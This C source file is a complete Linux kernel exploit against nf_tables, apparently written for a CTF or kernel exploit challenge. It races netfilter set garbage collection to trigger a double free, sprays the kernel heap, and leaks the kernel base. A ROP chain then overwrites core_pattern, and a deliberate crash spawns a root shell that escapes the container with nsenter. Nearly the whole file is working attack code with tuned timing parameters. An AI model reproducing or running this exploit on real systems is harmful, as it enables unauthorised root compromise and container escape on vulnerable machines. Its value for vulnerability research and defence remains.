#define _GNU_SOURCE
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>
#include <sched.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <fcntl.h>

#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <netlink/msg.h>
#include <netlink/attr.h>
#include <netlink/netlink.h>
#include <netlink/netfilter/nfnl.h>

#include <libmnl/libmnl.h>
#include <libnftnl/rule.h>
#include <libnftnl/set.h>
#include <libnftnl/expr.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/object.h>

#include "params.h"

/* PARAMS
 *
 * local qemu emulation:
 * - timer: 100
 * - timeout: 1000
 * - block cnt: 200
 * - module load cnt: 10
 *
 * local qemu kvm:
 * - timer: 100
 * - timeout: 350
 * - block cnt: 200
 * - module load cnt: 200
 *
 * remote: (blocking take 300/4 = 75ms)
 * - timer: 25
 * - timeout: 100 (~50% margin for high server load)
 * - block cnt: 200
 * - module load cnt: 200 (to make double free ocurr before the retry setelem allocation)
 */
const unsigned setelem_timeout = 100;
const unsigned gc_interval = 25;
const unsigned blocking_set_cnt = 200;

#define error(msg) do { \
    perror("\33[2K\r[-] " msg); \
    exit(EXIT_FAILURE); \
} while (0)

#define error_s(msg) do { \
    printf("\33[2K\r[-] " msg); \
    exit(EXIT_FAILURE); \
} while (0)

#define info(msg, ...) \
  printf("[*] " msg "\n" __VA_OPT__(,) __VA_ARGS__)

#define progress(msg, ...) \
  printf("[ ] " msg __VA_OPT__(,) __VA_ARGS__)

#define done() printf("\0337\r[+]\0338: done\n")
#define success() printf("\0337\r[+]\338: success\n")

#define BATCH_BEGIN(batch, buf, buf_sz) \
  do { \
    batch = mnl_nlmsg_batch_start(buf, buf_sz); \
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); \
    mnl_nlmsg_batch_next(batch); \
  } while (0)

#define BATCH_END_SEND(batch) \
  do { \
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); \
    mnl_nlmsg_batch_next(batch); \
    ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), \
        mnl_nlmsg_batch_size(batch)); \
    if (ret < 0) { \
      error("mnl_socket_sendto"); \
    } \
    mnl_nlmsg_batch_stop(batch); \
  } while (0)

const uint8_t family = NFPROTO_IPV4;

char buf[0x100000];
char buffer[0x1000];
int msgq[0x20];
size_t *leaked_data;
size_t kbase;
size_t fake_ops;
unsigned long user_cs, user_ss, user_rsp, user_rflags;
uint32_t seq, objseq;

struct msg {
  long mtype;
  char mtext[];
};

char msg_buf[0x2000];
char user_buf[] = "|/proc/%P/fd/666";

void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp),"=r" (user_rflags) : : "memory");
}

void wait_gc() {
  progress("wait for garbage collection");
  sleep(1);
  done();
}

void set_cpu(int cpu_n) {
  cpu_set_t set;

  CPU_ZERO(&set);
  CPU_SET(cpu_n, &set);

  progress("pin cpu @ core %d", cpu_n);
  if (sched_setaffinity(0, sizeof(set), &set) < 0) {
    error("sched_setaffinity");
  }
  done();
}

void msg_alloc(int msgqid, char *data, size_t size) {
  struct msg *msg = (struct msg *)msg_buf;
  msg->mtype = 1;

  size -= 0x30;
  memcpy(msg->mtext, data, size);

  if (msgsnd(msgqid, msg, size, 0) < 0) {
    error("msgsnd");
  }
}

void msg_free(int msgqid) {
  struct msg *msg = (struct msg *)msg_buf;
  if (msgrcv(msgqid, msg, sizeof(msg_buf)-8, 0, IPC_NOWAIT) < 0) {
    error("msgrcv");
  }
}

void shell() {
  // for (int i = 0; i < 0x20; i++) {
  //   for (int j = 0; j < 60; j++) {
  //     msg_free(msgq[i]);
  //   }
  // }
  info("drop root shell :)");
  char *args[] = {
    "/bin/sh", "-c",
    "nsenter --target 1 -m -p /bin/bash -c 'cat /flag; sleep 300'",
    NULL
  };
  execve(args[0], args, NULL);
}

void hexdump(const void* data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char*)data)[i]);
    if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char*)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i+1) % 8 == 0 || i+1 == size) {
      printf(" ");
      if ((i+1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i+1 == size) {
        ascii[(i+1) % 16] = '\0';
        if ((i+1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i+1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

static struct nftnl_table *new_table(const char *name)
{
  struct nftnl_table *t;

  t = nftnl_table_alloc();
  if (!t)
    error("new_table");

  nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
  nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);

  return t;
}

void add_dynset(struct nftnl_rule *r, const char *set) {
  struct nftnl_expr *e;
  e = nftnl_expr_alloc("dynset");
  if (!e)
    error("new_expr");

  nftnl_expr_set_str(e, NFTNL_EXPR_DYNSET_SET_NAME, set);
  nftnl_expr_set_u32(e, NFTNL_EXPR_DYNSET_OP, 0);
  nftnl_expr_set_u32(e, NFTNL_EXPR_DYNSET_SREG_KEY, NFT_REG32_00);
  nftnl_expr_set_u32(e, NFTNL_EXPR_DYNSET_SREG_DATA, NFT_REG32_00);
  nftnl_rule_add_expr(r, e);
}

struct nftnl_rule *new_rule(const char *table, const char *chain) {
  struct nftnl_rule *r = NULL;
  uint8_t proto;
  uint16_t dport;

  r = nftnl_rule_alloc();
  if (r == NULL) {
    perror("OOM");
    exit(EXIT_FAILURE);
  }

  nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
  nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
  nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
  return r;
}

struct nftnl_obj *new_object(const char *table, const char *name) {
  struct nftnl_obj *t;

  t = nftnl_obj_alloc();
  if (!t)
    error("new_object");

  nftnl_obj_set_u32(t, NFTNL_OBJ_FAMILY, family);
  nftnl_obj_set_u32(t, NFTNL_OBJ_TYPE, NFT_OBJECT_CT_EXPECT);
  nftnl_obj_set_str(t, NFTNL_OBJ_TABLE, table);
  nftnl_obj_set_str(t, NFTNL_OBJ_NAME, name);
  nftnl_obj_set_u8(t, NFTNL_OBJ_CT_EXPECT_L4PROTO, IPPROTO_TCP);
  nftnl_obj_set_u8(t, NFTNL_OBJ_CT_EXPECT_SIZE, 0x41);
  nftnl_obj_set_u16(t, NFTNL_OBJ_CT_EXPECT_DPORT, 0x4141);
  nftnl_obj_set_u32(t, NFTNL_OBJ_CT_EXPECT_TIMEOUT, 0x41414141);

  return t;
}

void nftnl_obj_nlmsg_build_simple_payload(struct nlmsghdr *nlh,
    const char *table, const char *name, uint32_t type) {
  mnl_attr_put_strz(nlh, NFTA_OBJ_TABLE, table);
  mnl_attr_put_strz(nlh, NFTA_OBJ_NAME, name);
  mnl_attr_put_u32(nlh, NFTA_OBJ_TYPE, htonl(type));
  mnl_attr_put_strz(nlh, NFTA_OBJ_DATA, "DATA");
}

struct nftnl_set *new_hash_set(const char *table, const char *name) {
  struct nftnl_set *s = NULL;

  s = nftnl_set_alloc();
  if (!s)
    error("new_set");

  nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
  nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);
  nftnl_set_set_str(s, NFTNL_SET_NAME, name);
  nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, sizeof(uint32_t));
  /* inet service type, see nftables/include/datatypes.h */
  nftnl_set_set_u32(s, NFTNL_SET_KEY_TYPE, 13);
  nftnl_set_set_u32(s, NFTNL_SET_ID, 1);
  nftnl_set_set_u32(s, NFTNL_SET_FLAGS, NFT_SET_MAP | NFT_SET_ANONYMOUS);
  nftnl_set_set_u32(s, NFTNL_SET_DATA_TYPE, NFT_DATA_VALUE);
  nftnl_set_set_u32(s, NFTNL_SET_DATA_LEN, 4);

  return s;
}

struct nftnl_set *new_rhash_set(const char *table, const char *name) {
  struct nftnl_set *s = NULL;

  s = nftnl_set_alloc();
  if (!s)
    error("new_set");

  nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
  nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);
  nftnl_set_set_str(s, NFTNL_SET_NAME, name);
  nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, sizeof(uint32_t));
  /* inet service type, see nftables/include/datatypes.h */
  nftnl_set_set_u32(s, NFTNL_SET_KEY_TYPE, 13);
  nftnl_set_set_u32(s, NFTNL_SET_ID, 1);
  nftnl_set_set_u32(s, NFTNL_SET_FLAGS, NFT_SET_MAP | NFT_SET_TIMEOUT);
  nftnl_set_set_u32(s, NFTNL_SET_GC_INTERVAL, gc_interval); // default: 0 (1s)
  nftnl_set_set_u32(s, NFTNL_SET_DATA_TYPE, NFT_DATA_VALUE);
  nftnl_set_set_u32(s, NFTNL_SET_DATA_LEN, 4);

  return s;
}

struct nftnl_set_elem *new_setelem_key(int len, int key) {
  struct nftnl_set_elem *e;
  uint32_t flags = 0;

  e = nftnl_set_elem_alloc();
  if (!e)
    error("new_setelem");

  nftnl_set_elem_set_u32(e, NFTNL_SET_ELEM_KEY, key);
  nftnl_set_elem_set(e, NFTNL_SET_ELEM_DATA, buffer, 4); // use the same as SET_DATA_LEN
  nftnl_set_elem_set(e, NFTNL_SET_ELEM_USERDATA, buffer, len);
  nftnl_set_elem_set(e, NFTNL_SET_ELEM_FLAGS, &flags, sizeof(flags));

  return e;
}

struct nftnl_set_elem *new_setelem_timeout(int len, int timeout) {
  struct nftnl_set_elem *e;
  uint32_t flags = 0;

  e = nftnl_set_elem_alloc();
  if (!e)
    error("new_setelem");

  nftnl_set_elem_set_u64(e, NFTNL_SET_ELEM_TIMEOUT, timeout); // timeout 1s
  nftnl_set_elem_set_u32(e, NFTNL_SET_ELEM_KEY, 0x4141);
  nftnl_set_elem_set(e, NFTNL_SET_ELEM_DATA, buffer, 4); // use the same as SET_DATA_LEN
  nftnl_set_elem_set(e, NFTNL_SET_ELEM_USERDATA, buffer, len);
  nftnl_set_elem_set(e, NFTNL_SET_ELEM_FLAGS, &flags, sizeof(flags));

  return e;
}

struct nftnl_chain *new_chain(const char *table, const char *name) {
  struct nftnl_chain *t;
  t = nftnl_chain_alloc();
  if (!t)
    error("new_chain");

  nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table);
  nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, name);

  return t;
}

int leak_object_cb(const struct nlmsghdr *nlh, void *data) {
  struct nftnl_table *t;
  struct nlattr *nla[NFTA_TABLE_MAX+1] = {};
  struct nlattr *attr;
  int len, attrlen;

  if (nlh->nlmsg_type == NLMSG_ERROR) {
    error_s("received NLMSG_ERROR message");
  }

  attr = (struct nlattr *)((char *)nlh + nlmsg_total_size(sizeof(struct nfgenmsg)));
  attrlen = nlh->nlmsg_len - nlmsg_total_size(sizeof(struct nfgenmsg));
  nla_parse(nla, NFTA_TABLE_MAX, attr, attrlen, NULL);

  if (!nla[NFTA_TABLE_USERDATA]) {
    error_s("not received userdata");
  }

  free(leaked_data);
  len = nla_len(nla[NFTA_TABLE_USERDATA]);
  leaked_data = malloc(len);

  nla_memcpy(leaked_data, nla[NFTA_TABLE_USERDATA], len);
  hexdump(leaked_data, len);

  // sanity check (obj->ops)
  if (leaked_data[16] < 0xffffffff00000000UL) {
    error_s("object leak failed");
  }

  return MNL_CB_OK;
}

void setup_block(struct mnl_socket *nl, const char *tablename, const char *setname) {
  struct nftnl_set *set;
  struct nftnl_rule *rule;
  struct nftnl_obj *obj;
  struct nftnl_set_elem *setelem;
  struct nlmsghdr *nlh;
  struct mnl_nlmsg_batch *batch;
  int ret, key = 0x10000;

  set = new_hash_set(tablename, setname);
  rule = new_rule(tablename, "pwn_chain");
  add_dynset(rule, setname);

  int bufsz = 0x5000000;
  char *reqbuf = malloc(bufsz);

  // 0x68000
  setsockopt(mnl_socket_get_fd(nl), SOL_SOCKET, SO_SNDBUF, &bufsz, sizeof(bufsz));
  BATCH_BEGIN(batch, reqbuf, bufsz);

  // BUILD BLOCK SET
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWSET, family,
      NLM_F_CREATE | NLM_F_EXCL, seq++);
  nftnl_set_nlmsg_build_payload(nlh, set);
  mnl_nlmsg_batch_next(batch);

  /* create a bunch of (9500) setelem to delay */
  // total batch size should < 0x68000
  for (int i = 0; i < 19; ++i) {
    set = new_hash_set(tablename, setname);
    // single request size should < 0x10000
    for (int j = 0; j < 500; ++j) {
      setelem = new_setelem_key(1, key++);
      nftnl_set_elem_add(set, setelem);
    }

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSETELEM, family,
        NLM_F_CREATE | NLM_F_EXCL,
        seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);
    nftnl_set_free(set);
  }

  // BUILD RULE TO REF ANON BLOCK SET
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWRULE, family,
      NLM_F_CREATE | NLM_F_EXCL,
      seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  // printf("batch size: 0x%lx\n", mnl_nlmsg_batch_size(batch));
  BATCH_END_SEND(batch);
}

size_t exploit_vuln(struct mnl_socket *nl, const char *tablename) {
  char buf[MNL_SOCKET_BUFFER_SIZE];
  struct mnl_nlmsg_batch *batch;
  struct nftnl_obj *obj;
  struct nftnl_table *tables[2];
  struct nlmsghdr *nlh;
  int ret;

  info("build fake obj->ops");

  size_t *fake_ops = (size_t *)malloc(192);
  memset(fake_ops, 0x41, 192);

  // [0] for rop chain on fake obj to pop off return value
  fake_ops[0] = kbase + pop_rdi;
  fake_ops[4] = kbase + push_rsi_jmp_deref_rsi_0x39; // ops->dump
  fake_ops[6] = kbase + nft_ct_expect_obj_type; // ops->type

  BATCH_BEGIN(batch, buf, sizeof(buf));

  for (int i = 0; i < 2; ++i) {
    char name[0x20] = {0};
    sprintf(name, "tbl_spray_%u", seq++);
    tables[i] = new_table(name);
    nftnl_table_set_data(tables[i], NFTNL_TABLE_USERDATA, buffer, 256); // allocate to kmalloc-cg-256
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWTABLE, family,
        NLM_F_CREATE | NLM_F_EXCL,
        seq++);
    nftnl_table_nlmsg_build_payload(nlh, tables[i]);
    mnl_nlmsg_batch_next(batch);
  }

  obj = new_object(tablename, "leak_rop_obj");
  // should <= 192 since atm there's only corrupted entry left
  nftnl_obj_set_data(obj, NFTNL_OBJ_USERDATA, fake_ops, 192);

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWOBJ, family,
      NLM_F_CREATE | NLM_F_EXCL,
      seq++);
  nftnl_obj_nlmsg_build_payload(nlh, obj);
  mnl_nlmsg_batch_next(batch);

  BATCH_END_SEND(batch);

  nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETTABLE, family,
      NLM_F_ACK, seq); // do not update seq number here
  nftnl_table_nlmsg_build_payload(nlh, tables[0]);

  if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
    error("mnl_socket_sendto");
  }

  // filter error report
  while (true) {
    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    if (ret < 0) {
      error("mnl_socket_recvfrom");
    } else if (ret > 100) {
      uint32_t type = NFTNL_OUTPUT_DEFAULT;
      mnl_cb_run(buf, ret, seq, mnl_socket_get_portid(nl), leak_object_cb, &type);
      break;
    }
  }

  size_t *fake_obj = leaked_data;
  size_t fake_ops_addr = leaked_data[9];
  info("leak kheap: 0x%lx\n", fake_ops_addr);

  // deallocate object by freeing table
  info("deallocate object");

  BATCH_BEGIN(batch, buf, sizeof(buf));

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_DELTABLE, family,
      NLM_F_CREATE | NLM_F_EXCL,
      seq++);
  nftnl_table_nlmsg_build_payload(nlh, tables[0]);
  mnl_nlmsg_batch_next(batch);

  BATCH_END_SEND(batch);
  wait_gc();

  info("build rop chain");

  // write object data back
  BATCH_BEGIN(batch, buf, sizeof(buf));

  // fake object (also use as rop chain)
  fake_obj[0] = kbase + add_rsp_0x50;
  fake_obj[11] = kbase + pop_rdi; // pop rdi; ret
  fake_obj[12] = kbase + core_pattern;
  fake_obj[13] = kbase + pop_3;
  fake_obj[16] = fake_ops_addr; // obj->ops

  fake_obj[17] = kbase + pop_rsi;
  fake_obj[18] = (size_t)&user_buf;
  fake_obj[19] = kbase + pop_rdx;
  fake_obj[20] = sizeof(user_buf);
  fake_obj[21] = kbase + copy_from_user;
  fake_obj[22] = kbase + rcu_read_unlock;
  fake_obj[23] = kbase + pop_rdi; // pop rdi; ret
  fake_obj[24] = 0x1000000000000;
  fake_obj[25] = kbase + delay_loop;
  *(size_t *)((char *)fake_obj + 0x39) = kbase + pop_rsp_ret; // stack pivot (object ptr is pushed by ops->dump)

  struct nftnl_table *table = new_table("pwn");
  nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, fake_obj, 256); // allocate to kmalloc-cg-256
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWTABLE, family,
      NLM_F_CREATE | NLM_F_EXCL,
      seq++);
  nftnl_table_nlmsg_build_payload(nlh, table);
  mnl_nlmsg_batch_next(batch);

  BATCH_END_SEND(batch);

  // invoke obj->ops->dump
  info("invoke ops->dump");
  nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETOBJ, family,
      NLM_F_ACK, seq++);
  nftnl_obj_nlmsg_build_payload(nlh, obj);

  if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
    error("mnl_socket_send");
  }
}

void leak_kbase(struct mnl_socket *nl, const char *tablename) {
  struct mnl_nlmsg_batch *batch;
  struct nftnl_table *table;
  struct nftnl_obj *obj;
  struct nftnl_set *set;
  struct nftnl_set_elem *setelem;
  struct nlmsghdr *nlh;
  int ret;

  set = new_rhash_set(tablename, "pwn_set");
  setelem = new_setelem_key(200, 0x41); // kmalloc-cg-256
  nftnl_set_elem_add(set, setelem);

  info("reclaim double freed memory");

  BATCH_BEGIN(batch, buf, sizeof(buf));

  table = new_table("leak_tbl");
  memset(buffer, 0, 256);
  nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, buffer, 256); // allocate to kmalloc-cg-256
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWTABLE, family,
      NLM_F_CREATE | NLM_F_EXCL,
      seq++);
  nftnl_table_nlmsg_build_payload(nlh, table);
  mnl_nlmsg_batch_next(batch);

  obj = new_object(tablename, "leak_obj");
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWOBJ, family,
      NLM_F_CREATE | NLM_F_EXCL,
      seq++);
  nftnl_obj_nlmsg_build_payload(nlh, obj);
  mnl_nlmsg_batch_next(batch);

  BATCH_END_SEND(batch);

  nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETTABLE, family,
      NLM_F_ACK, seq); // do not update seq number here
  nftnl_table_nlmsg_build_payload(nlh, table);

  if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
    error("mnl_socket_sendto");
  }

  while (true) {
    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    if (ret < 0) {
      error("mnl_socket_recvfrom");
    } else if (ret > 100) {
      uint32_t type = NFTNL_OUTPUT_DEFAULT;
      mnl_cb_run(buf, ret, seq, mnl_socket_get_portid(nl), leak_object_cb, &type);
      break;
    }
  }

  if (!leaked_data) {
    error("failed to run callback");
  }

  kbase = leaked_data[16] - nft_ct_expect_obj_ops;
  info("kernel base: 0x%lx", kbase);

  // reset double freed state
  info("reset double free state");
  BATCH_BEGIN(batch, buf, sizeof(buf));

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_DELOBJ, family,
      0, seq++);
  nftnl_obj_nlmsg_build_payload(nlh, obj);
  mnl_nlmsg_batch_next(batch);

  // free saved elem to avoid double free
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_DELSETELEM, family,
      0, seq++);
  nftnl_set_elems_nlmsg_build_payload(nlh, set);
  mnl_nlmsg_batch_next(batch);

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_DELTABLE, family,
      0, seq++);
  nftnl_table_nlmsg_build_payload(nlh, table);
  mnl_nlmsg_batch_next(batch);

  BATCH_END_SEND(batch);
  wait_gc();
  // // set it back after gc finished
  // set_cpu(1);
}

void trigger_vuln(struct mnl_socket *nl, const char *tablename) {
  struct timespec start, end;
  struct nftnl_table *table;
  struct nftnl_set *set;
  struct nftnl_chain *chain;
  struct nftnl_rule *rule;
  struct nftnl_set_elem *setelem, *setelem_bk;
  struct mnl_nlmsg_batch *batch;
  struct nlmsghdr *nlh;
  int ret;

  info("setup initial state");

  table = new_table(tablename);
  set = new_rhash_set(tablename, "pwn_set");
  chain = new_chain(tablename, "pwn_chain");
  rule = new_rule(tablename, "pwn_chain");
  setelem = new_setelem_timeout(200, setelem_timeout); // kmalloc-cg-256
  setelem_bk = new_setelem_key(200, 0x41); // kmalloc-cg-256
  nftnl_set_elem_add(set, setelem_bk);

  BATCH_BEGIN(batch, buf, sizeof(buf));

  // BUILD TABLE
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWTABLE, family,
      NLM_F_CREATE, seq++);
  nftnl_table_nlmsg_build_payload(nlh, table);
  nftnl_table_free(table);
  mnl_nlmsg_batch_next(batch);

  // BUILD CHAIN
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWCHAIN, family,
      NLM_F_CREATE, seq++);
  nftnl_chain_nlmsg_build_payload(nlh, chain);
  nftnl_chain_free(chain);
  mnl_nlmsg_batch_next(batch);

  // BUILD SET
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWSET, family,
      NLM_F_CREATE, seq++);
  nftnl_set_nlmsg_build_payload(nlh, set);
  mnl_nlmsg_batch_next(batch);

  BATCH_END_SEND(batch);

  progress("allocating blocking set");
  clock_gettime(CLOCK_MONOTONIC_RAW, &start);
  for (int i = 0; i < blocking_set_cnt; ++i) {
    char setname[0x30] = {};
    snprintf(setname, sizeof(setname), "block%d", i);
    setup_block(nl, tablename, setname);
  }
  clock_gettime(CLOCK_MONOTONIC_RAW, &end);
  done();
  info("blocking set allocation took %.3lf ms",
    (end.tv_sec - start.tv_sec) * 1000 +
    (end.tv_nsec - start.tv_nsec) / 1000000.0
  );

  // **importent**
  // rhash gc timer use `system_power_efficient_wq` workqueue for scheduling,
  // which is fucking not precise at all (will not be scheduled in high CPU usage...lol)
  // re-schedule main thread to a different CPU to avoid stopping gc thread from running
  //
  // Also a good news is since the freeing thread is using a different CPU,
  // the double free check will be bypassed!
  set_cpu(1);

  // setup backup elem after we switch to cpu1 to use the same cache
  BATCH_BEGIN(batch, buf, sizeof(buf));

  // BUILD BACKUP SETELEM
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWSETELEM, family,
      NLM_F_CREATE, seq++);
  nftnl_set_elems_nlmsg_build_payload(nlh, set);
  mnl_nlmsg_batch_next(batch);

  BATCH_END_SEND(batch);
  nftnl_set_free(set);

  set = new_rhash_set(tablename, "pwn_set");
  nftnl_set_elem_add(set, setelem);

  // race windows:               (should be removed *after* gc put it into list)
  // |          N ticks          | remove setelem |                  |      (mutex unlock)      |
  // ....|---------------- __nf_tables_abort ------------------------|-- loop to load modules --| mutex relock
  //       |--- nft_rhash_gc -> queue trans_gc_work | nft_trans_gc_work -> nft_trans_gc_work_done -> call_rcu free setelem
  //       ^-- timer kicks in                                               (grab mutex lock & check gc_seq & remove setelem)
  BATCH_BEGIN(batch, buf, sizeof(buf));

  // -EAGAIN will be instant handled, however it works a bit weird...
  // instead of delete the resolved module request in `nft_net->module_list`
  // `nf_tables_module_autoload()` it place it back, so the list will keep growing LOL
  for (int i = 0; i < 200; ++i) {
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWOBJ, family,
        NLM_F_CREATE | NLM_F_EXCL,
        seq++);

    // NFTNL_OBJ_TYPE cannot be direct set, manually build it here
    // obj = new_object_type(tablename, "idk", i + 100); // start from 100 (unused type)
    nftnl_obj_nlmsg_build_simple_payload(nlh, tablename, "obj", i + 100);
    mnl_nlmsg_batch_next(batch);
  }

  // BUILD SETELEM
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWSETELEM, family,
      NLM_F_CREATE | NLM_F_EXCL,
      seq++);
  nftnl_set_elems_nlmsg_build_payload(nlh, set);
  mnl_nlmsg_batch_next(batch);

  // DELRULE
  // to block setelem being removed during abort phase
  // free all rules under chain pwn_chain
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_DELRULE, family,
      NLM_F_EXCL,
      seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  // TO TRIGGER ABORT AUTOLOAD
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWOBJ, family,
      NLM_F_CREATE | NLM_F_EXCL,
      seq++);
  nftnl_obj_nlmsg_build_simple_payload(nlh, tablename, "obj", 6666);
  mnl_nlmsg_batch_next(batch);

  progress("trigger double free");
  clock_gettime(CLOCK_MONOTONIC_RAW, &start);
  BATCH_END_SEND(batch);
  clock_gettime(CLOCK_MONOTONIC_RAW, &end);
  success();

  info("batch resolution took %.3lf ms",
    (end.tv_sec - start.tv_sec) * 1000 +
    (end.tv_nsec - start.tv_nsec) / 1000000.0
  );

  wait_gc();
}

int setup_sandbox(void) {
  progress("setup user namespace");
  if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
    error("unshare");
  }
  done();
  return 0;
}

int check_core() {
  // Check if /proc/sys/kernel/core_pattern has been overwritten
  char buf[0x100] = {};
  int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
  read(core, buf, sizeof(buf));
  close(core);
  return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}

void crash() {
  int memfd = memfd_create("", 0);
  if (sendfile(memfd, open("root", 0), 0, 0xffffffff) == -1) {
    error("sendfile");
  }

  dup2(memfd, 666);
  close(memfd);
  while (check_core() == 0)
    sleep(1);

  *(size_t *)0 = 0;
}

int main(int argc, char *argv[]) {
  struct mnl_socket *nl;
  seq = 123456;

  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  if (fork() == 0) {
    set_cpu(0);
    strcpy(argv[0], "rabbit");
    while (1)
      sleep(1);
  }

  if (fork() == 0) {
    set_cpu(0);
    setsid();
    crash();
  }

  set_cpu(0);
  setup_sandbox();
  save_state();

  for (int i = 0; i < 0x20; ++i) {
    msgq[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (msgq[i] < 0) {
      error("msgget");
    }
  }

  nl = mnl_socket_open(NETLINK_NETFILTER);
  if (!nl) {
    error("mnl_socket_open");
  }

  if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
    error("mnl_socket_bind");
  }

  // de-fragmentation
  for (int i = 0; i < 0x20; i++) {
    for (int j = 0; j < 60; j++) {
      msg_alloc(msgq[i], buffer, 200);
    }
  }

  // main thread will eventually runs on core 1
  info("====== 1st stage ======");
  trigger_vuln(nl, "exp");
  leak_kbase(nl, "exp");

  info("====== 2nd stage ======");
  exploit_vuln(nl, "exp");

  error_s("exploit failed");
}
